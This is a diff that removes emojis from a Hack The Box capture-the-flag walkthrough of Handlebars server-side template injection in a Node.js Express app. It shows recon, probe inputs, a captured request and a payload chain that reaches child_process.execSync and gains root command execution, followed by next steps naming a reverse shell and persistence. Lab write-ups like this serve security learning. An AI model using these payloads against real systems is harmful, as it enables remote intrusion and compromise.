@@ -1,4 +1,4 @@
-# 💥 Hack The Box - Node.js SSTI to RCE Walkthrough  
+# Hack The Box - Node.js SSTI to RCE Walkthrough  
 **Target IP**: `10.129.99.197`  
 **Tech Stack**: Node.js, Express  
 **Vuln Type**: SSTI → RCE  
@@ -6,55 +6,55 @@
 
 ---
 
-## 🔍 Initial Recon - Discovering the Stack
+## Initial Recon - Discovering the Stack
 
 ```bash
 nmap -sV -sC 10.129.99.197
 ```
 
-🎯 Output:
-```
+ Output:
+```text
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
 80/tcp open  http    Node.js (Express middleware)
 ```
 
 We confirmed the web service is running **Node.js with Express**.  
-🔗 Further tech stack recon via [Wappalyzer](https://www.wappalyzer.com/) showed Node + Express on the backend.
+ Further tech stack recon via [Wappalyzer](https://www.wappalyzer.com/) showed Node + Express on the backend.
 
 ---
 
-## 🕸️ Web App Behavior - Input Reflection Found!
+## Web App Behavior - Input Reflection Found!
 
 We accessed the web interface and quickly discovered an **input field** that:
 
 - Accepts user-submitted content  
 - Reflects it **back on the page almost instantly**  
 
-🧠 This is a strong candidate for **SSTI (Server-Side Template Injection)**!
+ This is a strong candidate for **SSTI (Server-Side Template Injection)**!
 
 ---
 
-## 🧪 Testing for SSTI
+## Testing for SSTI
 
 We attempted several common SSTI test payloads:
 
 ```text
-{{7*7}}         ✅ caused a server error! 💥
-${7*7}          ❌ no effect
-<%= 7*7 %>      ❌ no effect
-${{7*7}}        ❌ no effect
-#{7*7}          ❌ no effect
+{{7*7}}          caused a server error! 
+${7*7}           no effect
+<%= 7*7 %>       no effect
+${{7*7}}         no effect
+#{7*7}           no effect
 ```
 
-✅ `{{7*7}}` triggering an error was our signal that **SSTI is likely present**, and **Handlebars.js** may be in use.
+ `{{7*7}}` triggering an error was our signal that **SSTI is likely present**, and **Handlebars.js** may be in use.
 
 ---
 
-## 📬 Intercepting Requests - Burp Suite Activated
+## Intercepting Requests - Burp Suite Activated
 
 We captured the form submission via Burp:
 
-```
+```text
 POST / HTTP/1.1
 Host: 10.129.99.197
 Content-Type: application/x-www-form-urlencoded
@@ -62,11 +62,11 @@ Content-Type: application/x-www-form-urlencoded
 email={{7*7}}&action=Submit
 ```
 
-🧠 The `email` field reflects content — our attack surface confirmed!
+ The `email` field reflects content — our attack surface confirmed!
 
 ---
 
-## 🧠 Exploitation Strategy - Escaping the Sandbox
+## Exploitation Strategy - Escaping the Sandbox
 
 Initial payloads like:
 
@@ -74,45 +74,45 @@ Initial payloads like:
 {{this.push "return require('child_process').exec('whoami')"}}
 ```
 
-❌ Failed with: `require is not defined`  
-➡️ This suggests the **template engine is sandboxed**.
+ Failed with: `require is not defined`  
+ This suggests the **template engine is sandboxed**.
 
 ---
 
-## 🧠 Breakout via `process.mainModule`
+## Breakout via `process.mainModule`
 
-### ✅ 1. `process` object is accessible
+### 1. `process` object is accessible
 
 ```handlebars
 {{this.push "return process"}}
 ```
 
 Output: `[object process]`  
-Boom! Access to the `process` object confirmed.
+Access to the `process` object is confirmed.
 
 ---
 
-### ✅ 2. Enumerated mainModule
+### 2. Enumerated mainModule
 
 ```handlebars
 {{this.push "return process.mainModule"}}
 ```
 
-Response showed full module structure — jackpot.
+The response exposed the full module structure.
 
 ---
 
-### ✅ 3. Gained `require` via mainModule
+### 3. Gained `require` via mainModule
 
 ```handlebars
 {{this.push "return process.mainModule.require('child_process')"}}
 ```
 
-✅ Success! `child_process` was returned as an object — module load confirmed!
+ Success! `child_process` was returned as an object — module load confirmed!
 
 ---
 
-### ✅ 4. Executed Arbitrary Commands
+### 4. Executed Arbitrary Commands
 
 ```handlebars
 {{this.push "return process.mainModule.require('child_process').execSync('whoami')"}}
@@ -141,12 +141,12 @@ full
 {{/with}}
 ```
 
-💥 Output: `root`  
-RCE achieved! 🎉
+ Output: `root`  
+RCE achieved! 
 
 ---
 
-## 🔄 Summary of Exploitation Chain
+## Summary of Exploitation Chain
 
 ```text
 1. Found SSTI in email field → {{7*7}} triggered error
@@ -161,13 +161,13 @@ RCE achieved! 🎉
 
 ---
 
-## 🔚 Next Steps
+## Next Steps
 
-- 🐚 Use `execSync()` to launch reverse shell
-- 🔍 Enumerate file system, users, credentials
-- 🧼 Clean payloads for stealth or chaining
-- 🔒 Consider persistence options
+-  Use `execSync()` to launch reverse shell
+-  Enumerate file system, users, credentials
+-  Clean payloads for stealth or chaining
+-  Consider persistence options
 
 ---  
 
-🏁 **Mission Status**: RCE confirmed via Handlebars SSTI → Node.js global object abuse → command execution. Time to pivot and escalate. 👑🐚  
+ **Summary:** RCE confirmed via Handlebars SSTI, then Node.js global object abuse for command execution. Continue with post-exploitation and privilege escalation as required.
